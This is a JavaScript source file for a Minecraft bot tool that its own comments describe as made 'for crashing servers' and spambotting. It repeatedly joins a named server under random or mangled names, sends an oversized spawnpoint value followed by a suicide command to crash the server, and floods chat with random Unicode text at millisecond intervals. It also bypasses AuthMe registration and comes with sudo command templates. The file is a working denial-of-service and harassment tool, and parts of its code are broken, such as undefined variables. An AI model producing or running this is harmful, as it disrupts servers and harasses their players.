/**
 * Variables you should NOT edit, even you alco
 */
const mc = require('mineflayer');
const wurstName = require('./utilities/wurstName');
const randomUnicodeString = (length) => Array.from({ length }, () => String.fromCharCode(Math.floor(Math.random() * (65536)))).join('');
const mojangFriendlyCharacters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
const randomSafeString = (length) => Array.from({ length }, () => mojangFriendlyCharacters[Math.floor(Math.random() * mojangFriendlyCharacters.length)]).join('');

/** 
 *   _____                     _      (")                      ___                             _____                     _    
 *  |_   _|   ___    __ _     | |      \|     ___      o O O  / __|    ___    __ __     o O O |_   _|   ___     ___     | |   
 *    | |    / -_)  / _` |    | |            (_-<     o       \__ \   / -_)   \ \ /    o        | |    / _ \   / _ \    | |   
 *   _|_|_   \___|  \__,_|   _|_|_   _____   /__/_   TS__[O]  |___/   \___|   /_\_\   TS__[O]  _|_|_   \___/   \___/   _|_|_  
 * _|"""""|_|"""""|_|"""""|_|"""""|_|     |_|"""""| {======|_|"""""|_|"""""|_|"""""| {======|_|"""""|_|"""""|_|"""""|_|"""""| 
 * "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
 * 
 * Teal's Sex Tool
 *  • For crashing servers.
 *  • Use it for spambotting a server.
 *  • Get your point across by spamming it.
 * 
 * How to use:
 *  • Input server IP to _ip variable
 *  • Provide name in username variable or leave it as undefined
 *  • Select from these modes:
 *      o 1 - Crash it (/spawnpoint)
 *              DESCRIPTION: 
 *                  - Joins as a weird name, unless safeName is true.
 *                  - IF 4 is on, that is spammed.
 *                  - Bot commits suicide, and continues to run messages until it leaves or crashes.
 *      o 2 - Spambot join
 *              DESCRIPTION: 
 *                  - Joins as a weird name unless username is filled. Then either uses username and replaces it with random letters. OR makes a safeName. 
 *                  - IF 4 is on, that is spammed.
 *                  - Bot continues to run messages until it leaves.
 *      o 3 - Crappily spambot a server (w/ same name (customized) over and over...)
 *              DESCRIPTION: 
 *                  - REQUIRES username VARIABLE TO BE FILLED.
 *                  - If it can actually get in, then it will spam 4.
 *                  - Bot continues to run messages until it leaves.
 *      o 4 - Execute OR Spam a message
 *        - Then shove into an array as so: [1,4] = crash, spam or say message. You cannot have the any of the first 3 at the same time, e.g. 1,2, 2,3, 1,3 only 1, 2, or 3.
 *        - YOU MUST EDIT THE executeMessages variable if using mode 4.
 *          - They are arrays so you can list multiple messages to run. For commands, simply type /<command> and it's following parameters.
 *          - To make a proper executeMessages entry, set the message, the timeout in seconds, and if it is spam or not. (Spam = interval it spams at, Execute = Timeout before message sends):
 *              [["message", 1, false], ["message2", 0.001, true]] (0.001 equals 1 millisecond)
 *          - Use true in the message parameter if it should be spam sent.
 *  • Does it use authMe? If it does, make the authMe variable true.
 *  • Does it not allow certain characters in your name? If it does, make the safeName variable true.
 *  • If you want something just short of a Wurst-generated name, then make generateCrapName true. It will ALWAYS use safe characters.
 *  • Set safeContent to true to only use Mojang characters.
 */

/**
 * Variables you should edit
 */
const _ip = 'kaboom.pw';
var username = undefined;

const modes = [1,4];
/**
 * @typedef {[string, number, boolean][]} messageArray
 * @type {messageArray}
 */
const executeMessages = [
];
const authMe = false;
const safeName = false;
const safeContent = false;
const generateCrapName = false;

/**
 * 
 * Templates for kaboom.pw
 * const executeMessages = [
 *   ["/sudo * gamemode survival", 1], 
 *   ["/sudo * fly", 1], 
 *   ["/sudo * username <your name here>", 5],
 *
 *   ["/sudo * jumpscare *", 0.001, true],
 *   [true, 0.001, true]
 * ];
 * 
 */
async function accountGenerator() {
    let name;
    if(!generateCrapName) {
    if(safeName) {
        name = randomSafeString(16);
    } else name = randomUnicodeString(16);
    } else name = wurstName.generateName(1)[0];
    var client;
    if(modes.includes(3)) {
        if(typeof username !== 'string') {
            username = 'Username';
        }
        name = await fuckifyName(username);
        client = mc.createBot({
            host: _ip,
            username: name,
            version: false,
        })
    } else {
        client = mc.createBot({
            host: _ip,
            username: name,
            version: false,
        })
    }
    authMeParameter(client);
}
accountGenerator();
setInterval(() => {
    accountGenerator();
}, 6000);
function authMeParameter(client) {
if(authMe) {
    if(jsonMsg.extra) {
        if(jsonMsg.extra[0]) {
            if(jsonMsg.extra[0].color == 'dark_aqua') {
                if(jsonMsg.extra[0].text == 'Please, register to the server with the command: /register <password> <ConfirmPassword>') {
                    client.chat('/register ' + password + ' ' + password);
                    mainArea(client);
                 }
            } else if(jsonMsg.extra[0].color == 'red') {
                if(jsonMsg.extra[0].text == 'Please, login with the command: /login <password>') {
                    console.log('Oh shit, I don\'t know the password.')
                }
            } else if(jsonMsg.extra[0].color == 'dark_green') {
                if(jsonMsg.extra[0].text == 'Logged-in due to Session Reconnection.') {
                    mainArea(client);
                }
            }
    }}
} else mainArea(client);
}
function mainArea(client) {
if(modes.includes(1)) {
    client.on('error', function (err) {
        if(err.message.startsWith('connect ECONNREFUSED')) {
            console.log(_ip + ' is down.');
        }
    })
    client.on('login', function () {
        console.log('Logging in as ' + client.username);
        client.chat("/spawnpoint @a ~ ~ 2147483647");
        setTimeout(() => {
            client.chat('/suicide');
        }, 1000);  
        setTimeout(() => {
            if(modes.includes(4)) {
                for(var executeMessage of executeMessages) {
                    if(executeMessage[2] !== true) setTimeout(() => {
                        client.chat(executeMessage[0] == true ? generateContent(1000) : executeMessage[0]);
                    }, executeMessage[1]*1000);
                }
                var randomInterval = executeMessages.filter(e => e[2] == true);
                randomInterval = randomInterval[Math.floor(Math.random() * randomInterval.length)];
                var interval = setInterval(() => {
                    client.chat(randomInterval[0] == true ? generateContent(1000) : randomInterval[0]);
                }, randomInterval[1]*1000);
            }
            setTimeout(() => {
                client.quit();
                clearInterval(interval);
            }, 7000);  
        }, 2000);
    })
} else if(modes.includes(2) || modes.includes(3)) {
    client.on('login', function () {
        console.log('Logging in as ' + client.username);
        setTimeout(() => {
            if(modes.includes(4)) {
                for(var executeMessage of executeMessages) {
                    if(executeMessage[2] !== true) setTimeout(() => {
                        client.chat(executeMessage[0] == true ? generateContent(1000) : executeMessage[0]);
                    }, executeMessage[1]*1000);
                }
                var randomInterval = executeMessages.filter(e => e[2] == true);
                randomInterval = randomInterval[Math.floor(Math.random() * randomInterval.length)];
                var interval = setInterval(() => {
                    client.chat(randomInterval[0] == true ? generateContent(1000) : randomInterval[0]);
                }, randomInterval[1]*1000);
            }
            setTimeout(() => {
                client.quit();
                clearInterval(interval);
            }, 7000);  
        }, 2000);
    })
} else {}
}

function generateContent(length) {
    if(safeContent) {
        return randomSafeString(length);
    } else return randomUnicodeString(length);
}

function fuckifyName(name) {
    var initalName = name;
    if(safeName) {
        name = name.split('').map(c => Math.random() > 0.8 ? randomSafeString(1) : c).join('');
    } else {
        name = name.split('').map(c => Math.random() > 0.8 ? randomUnicodeString(1) : c).join('');
    }
    if(name == initalName) {
        fuckifyName(name);
    } else return name;
}

